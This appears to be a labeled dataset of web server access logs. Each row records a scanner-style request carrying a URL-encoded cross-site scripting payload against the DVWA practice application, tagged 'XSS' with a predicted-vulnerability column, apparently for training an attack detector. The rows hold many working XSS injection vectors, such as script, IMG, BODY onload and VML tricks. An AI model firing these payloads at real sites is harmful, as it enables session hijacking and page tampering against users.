ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 16:31:16-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cvmlframe%20xmlns%3durn%3aschemas-microsoft-com%3avml%20style%3dbehavior%3aurl(%23default%23vml)%3bposition%3aabsolute%3bwidth%3a100%%3bheight%3a100%%20src%3d%(vml)s%23xss%3e%3c%2fvmlframe%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1800,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cvmlframe%20xmlns%3durn%3aschemas-microsoft-com%3avml%20style%3dbehavior%3aurl(%23default%23vml)%3bposition%3aabsolute%3bwidth%3a100%%3bheight%3a100%%20src%3d%(vml)s%23xss%3e%3c%2fvmlframe%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,284,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:31:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=1%3ca%20href%3d%23%3e%3cline%20xmlns%3durn%3aschemas-microsoft-com%3avml%20style%3dbehavior%3aurl(%23default%23vml)%3bposition%3aabsolute%20href%3djavascript%3ajavascript%3aalert(1)%20strokecolor%3dwhite%20strokeweight%3d1000px%20from%3d0%20to%3d1000%20%2f%3e%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1819,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=1%3ca%20href%3d%23%3e%3cline%20xmlns%3durn%3aschemas-microsoft-com%3avml%20style%3dbehavior%3aurl(%23default%23vml)%3bposition%3aabsolute%20href%3djavascript%3ajavascript%3aalert(1)%20strokecolor%3dwhite%20strokeweight%3d1000px%20from%3d0%20to%3d1000%20%2f%3e%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,360,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:31:34-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22behavior%3aurl(%23default%23AnchorClick)%3b%22%20folder%3d%22javascript%3ajavascript%3aalert(1)%22%3eXXX%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1758,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20style%3d%22behavior%3aurl(%23default%23AnchorClick)%3b%22%20folder%3d%22javascript%3ajavascript%3aalert(1)%22%3eXXX%3c%2fa%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,223,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:31:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20style%3d%22behavior%3aurl(%(sct)s)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1726,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20style%3d%22behavior%3aurl(%(sct)s)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,138,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:31:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cxml%20id%3d%22xss%22%20src%3d%22%(htc)s%22%3e%3c%2fxml%3e%20%3clabel%20dataformatas%3d%22html%22%20datasrc%3d%22%23xss%22%20datafld%3d%22payload%22%3e%3c%2flabel%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1758,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cxml%20id%3d%22xss%22%20src%3d%22%(htc)s%22%3e%3c%2fxml%3e%20%3clabel%20dataformatas%3d%22html%22%20datasrc%3d%22%23xss%22%20datafld%3d%22payload%22%3e%3c%2flabel%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,258,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cevent-source%20src%3d%22%(event)s%22%20onload%3d%22javascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1732,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cevent-source%20src%3d%22%(event)s%22%20onload%3d%22javascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,172,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:12-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javascript%3ajavascript%3aalert(1)%22%3e%3cevent-source%20src%3d%22data%3aapplication%2fx-dom-event-stream,Event%3aclick%0Adata%3aXXX%0A%0A%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1759,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3d%22javascript%3ajavascript%3aalert(1)%22%3e%3cevent-source%20src%3d%22data%3aapplication%2fx-dom-event-stream,Event%3aclick%0Adata%3aXXX%0A%0A%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,253,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:21-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3d%22x%22%3ex%3c%2fdiv%3e%20%3cxml%3anamespace%20prefix%3d%22t%22%3e%20%3cimport%20namespace%3d%22t%22%20implementation%3d%22%23default%23time2%22%3e%20%3ct%3aset%20attributeName%3d%22innerHTML%22%20targetElement%3d%22x%22%20to%3d%22%26lt%3bimg%26%2311%3bsrc%3dx%3ax%26%2311%3bonerror%26%2311%3b%3djavascript%3aalert(1)%26gt%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1824,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdiv%20id%3d%22x%22%3ex%3c%2fdiv%3e%20%3cxml%3anamespace%20prefix%3d%22t%22%3e%20%3cimport%20namespace%3d%22t%22%20implementation%3d%22%23default%23time2%22%3e%20%3ct%3aset%20attributeName%3d%22innerHTML%22%20targetElement%3d%22x%22%20to%3d%22%26lt%3bimg%26%2311%3bsrc%3dx%3ax%26%2311%3bonerror%26%2311%3b%3djavascript%3aalert(1)%26gt%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,436,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:31-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%(payload)s%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%(payload)s%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,129,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%(jscript)s%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%(jscript)s%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,138,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:50-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20language%3d'javascript'%20src%3d'%(jscript)s'%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1726,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20language%3d'javascript'%20src%3d'%(jscript)s'%3e%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,166,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:32:59-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,139,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,152,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:18-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3djavascript%3ajavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1721,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3djavascript%3ajavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,143,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:28-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%60javascript%3ajavascript%3aalert(1)%60%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%60javascript%3ajavascript%3aalert(1)%60%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,149,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:37-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cSCRIPT%20SRC%3d%(jscript)s%3f%3cB%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cSCRIPT%20SRC%3d%(jscript)s%3f%3cB%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,130,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:47-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cFRAMESET%3e%3cFRAME%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e%3c%2fFRAMESET%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1733,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cFRAMESET%3e%3cFRAME%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e%3c%2fFRAMESET%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,185,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:33:56-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cBODY%20ONLOAD%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cBODY%20ONLOAD%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:34:06-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cBODY%20ONLOAD%3djavascript%3ajavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1726,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cBODY%20ONLOAD%3djavascript%3ajavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,147,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:34:15-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav ascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,400,483,-,-,XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22jav,ascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,144,5,1,XSS
12.12.12.11,-,-,2024-07-01 16:34:25-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cBODY%20onload!%23$%%%26()%2a~%2b-_%2e,%3a%3b%3f@[%2f%7c%5c]%5e%60%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1755,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cBODY%20onload!%23$%%%26()%2a~%2b-_%2e,%3a%3b%3f@[%2f%7c%5c]%5e%60%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,186,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:34:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cSCRIPT%2fSRC%3d%22%(jscript)s%22%3e%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cSCRIPT%2fSRC%3d%22%(jscript)s%22%3e%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:34:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3c%3cSCRIPT%3e%(payload)s%2f%2f%3c%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3c%3cSCRIPT%3e%(payload)s%2f%2f%3c%3c%2fSCRIPT%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,141,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:34:54-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3ajavascript%3aalert(1)%22&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20SRC%3d%22javascript%3ajavascript%3aalert(1)%22&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,146,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:04-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3d%(scriptlet)s%20%3c&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3d%(scriptlet)s%20%3c&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,128,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:14-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cINPUT%20TYPE%3d%22IMAGE%22%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1736,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cINPUT%20TYPE%3d%22IMAGE%22%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,175,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20DYNSRC%3d%22javascript%3ajavascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1726,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20DYNSRC%3d%22javascript%3ajavascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,152,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:33-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cIMG%20LOWSRC%3d%22javascript%3ajavascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cIMG%20LOWSRC%3d%22javascript%3ajavascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,152,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:43-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cBGSOUND%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cBGSOUND%20SRC%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,156,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:35:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cBR%20SIZE%3d%22%26%7bjavascript%3aalert(1)%7d%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cBR%20SIZE%3d%22%26%7bjavascript%3aalert(1)%7d%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,145,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:36:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cLAYER%20SRC%3d%22%(scriptlet)s%22%3e%3c%2fLAYER%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cLAYER%20SRC%3d%22%(scriptlet)s%22%3e%3c%2fLAYER%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:36:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cLINK%20REL%3d%22stylesheet%22%20HREF%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1732,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cLINK%20REL%3d%22stylesheet%22%20HREF%3d%22javascript%3ajavascript%3aalert(1)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,179,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:36:22-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cSTYLE%3e@import'%(css)s'%3b%3c%2fSTYLE%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1727,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cSTYLE%3e@import'%(css)s'%3b%3c%2fSTYLE%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,135,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:36:32-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cMETA%20HTTP-EQUIV%3d%22Link%22%20Content%3d%22%3c%(css)s%3e%3b%20REL%3dstylesheet%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1740,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cMETA%20HTTP-EQUIV%3d%22Link%22%20Content%3d%22%3c%(css)s%3e%3b%20REL%3dstylesheet%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,181,5,116,XSS
12.12.12.11,-,-,2024-07-01 16:36:42-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cXSS%20STYLE%3d%22behavior%3a%20url(%(htc)s)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1730,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cXSS%20STYLE%3d%22behavior%3a%20url(%(htc)s)%3b%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,146,5,116,XSS
